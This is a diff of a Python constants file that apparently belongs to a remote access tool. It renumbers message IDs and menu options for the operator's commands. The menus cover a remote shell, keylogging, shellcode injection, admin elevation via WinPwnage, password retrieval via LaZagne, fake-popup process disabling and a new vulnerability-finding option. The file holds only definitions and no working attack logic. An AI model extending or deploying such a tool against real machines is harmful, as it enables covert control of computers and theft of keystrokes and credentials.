@@ -30,19 +30,17 @@ CLIENT_KEYLOG_DUMP = 18
 CLIENT_RUN_CMD = 19
 CLIENT_DISABLE_PROCESS = 20
 SERVER_SHELL_DIR = 21
-CLIENT_SHELL_CMD = 22
-CLIENT_SHELL_LEAVE = 23
+SERVER_SHELL_CMD = 22
+SERVER_SHELL_LEAVE = 23
 SERVER_COMMAND_RSP = 24
-SERVER_FILE_RECV = 25
-CLIENT_PYTHON_INTERPRETER_CMD = 26
-CLIENT_PYTHON_INTERPRETER_LEAVE = 27
+SERVER_PYTHON_INTERPRETER_CMD = 26
+SERVER_PYTHON_INTERPRETER_LEAVE = 27
 SERVER_PYTHON_INTERPRETER_RSP = 28
-SERVER_SCREENSHOT = 29
 CLIENT_UPLOAD_FILE_PATH = 30
 CLIENT_SHELLCODE = 31
 CLIENT_ELEVATE = 32
-SERVER_ELEVATE_RSP = 33
 CLIENT_PWD = 34
+CLIENT_GET_VULN = 35
 
 # all menu arguments must be a single char
 MENU_HELP = "H"
@@ -65,7 +63,7 @@ SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
 
 MENU_INTERACT_RECV = "R"
 MENU_INTERACT_SEND = "S"
-MENU_INTERACT_SCRN = "P"
+MENU_INTERACT_SCRN = "N"
 MENU_INTERACT_STARTUP = "A"
 MENU_INTERACT_INFO = "O"
 MENU_INTERACT_SHELL = "E"
@@ -76,8 +74,9 @@ MENU_INTERACT_LOCK = "L"
 MENU_INTERACT_BACKGROUND = "B"
 MENU_INTERACT_CLOSE = "C"
 MENU_INTERACT_SHELLCODE = "J"
-MENU_INTERACT_ELEVATE = "V"
-MENU_INTERACT_PWD = "U"
+MENU_INTERACT_ELEVATE = "T"
+MENU_INTERACT_PWD = "P"
+MENU_INTERACT_VULN = "V"
 
 # arg2 commands
 MENU_INTERACT_KEYLOG_START = "start"
@@ -91,6 +90,8 @@ MENU_INTERACT_DISABLE_PROCESS_POPUP = "fake_popup"
 
 MENU_INTERACT_PWD_PASS = "password"
 
+MENU_INTERACT_VULN_EXP_ONLY = "exploit-only"
+
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                 {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                 {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
@@ -98,8 +99,11 @@ SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                  "arg2": "process_name", "optional_arg3": f"({MENU_INTERACT_DISABLE_PROCESS_POPUP})",
                                  "platform": "windows"},
                                 {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode", "platform": "windows"},
-                                {"arg": MENU_INTERACT_ELEVATE, "info": "Attempt to launch as admin", "platform": "windows"},
-                                {"arg": MENU_INTERACT_PWD, "info": "Retrieve passwords", "optional_arg2": "password"},
+                                {"arg": MENU_INTERACT_ELEVATE, "info": "Attempt to launch as admin", "platform": "windows",
+                                 "note": "using WinPwnage"},
+                                {"arg": MENU_INTERACT_VULN, "info": "Find vulnerability(s)", "optional_arg2": f"({MENU_INTERACT_VULN_EXP_ONLY})"},
+                                {"arg": MENU_INTERACT_PWD, "info": "Retrieve passwords", "optional_arg2": "password",
+                                 "note": "using LaZagne"},
                                 {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                  "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                 {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
